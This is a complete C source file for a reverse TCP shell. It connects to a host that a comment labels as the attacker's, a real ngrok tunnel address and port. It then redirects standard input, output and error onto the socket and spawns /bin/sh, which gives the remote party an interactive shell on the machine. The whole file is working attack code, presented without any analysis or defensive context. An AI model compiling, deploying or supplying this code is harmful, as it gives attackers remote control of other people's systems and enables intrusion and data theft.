/* Reverse TCP shell implementation in C */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>

int main(void) {
    const char *RHOST = strdup("2.tcp.eu.ngrok.io");  /* attacker's IP/domain */
    const char *RPORT = strdup("13570");  /* attacker's port      */

    /* hints for getaddrinfo() */
    struct addrinfo hints;
    /* to store the results from getaddrinfo() */
    struct addrinfo *remote_addr;
    /* status code from getaddrinfo() */
    int status;
    /* to loop over the linked list of remote_addr */
    struct addrinfo *p;
    /* socket file descriptor */
    int sockfd;

    memset(&hints, '\0', sizeof(hints));
    hints.ai_family = AF_UNSPEC; /* can be IPv4 or IPv6 */
    hints.ai_socktype = SOCK_STREAM;

    if ( (status = getaddrinfo(RHOST, RPORT, &hints, &remote_addr)) != 0 ) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return EXIT_FAILURE;
    }

    /* loop over the addresses returned by getaddrinfo() as the first one may
     * not always work
     */
    for (p = remote_addr; p != NULL; p = p->ai_next) {

        /* open the socket */
        if ( (sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            perror("socket");
            fprintf(stderr, "socket: trying the next address\n");
            continue;
        }

        /* connect to the remote */
        if ( connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(sockfd);
            perror("connect");
            fprintf(stderr, "connect: trying the next address\n");
            continue;
        }

        break;
    }

    if (p == NULL) {
        fprintf(stderr, "client: failed to connect\n");
        return EXIT_FAILURE;
    }

    printf("Connecting to %s:%s\n", RHOST, RPORT);

    /* we no longer need the address information */
    freeaddrinfo(remote_addr);
    free((void *) RHOST);
    free((void *) RPORT);

    /* duplicate stdin, stdout, and stderr so that they refer to the same sockfd */
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    /* spawn the shell */
    char *argv[2] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);

    close(sockfd);

    return EXIT_SUCCESS;
}
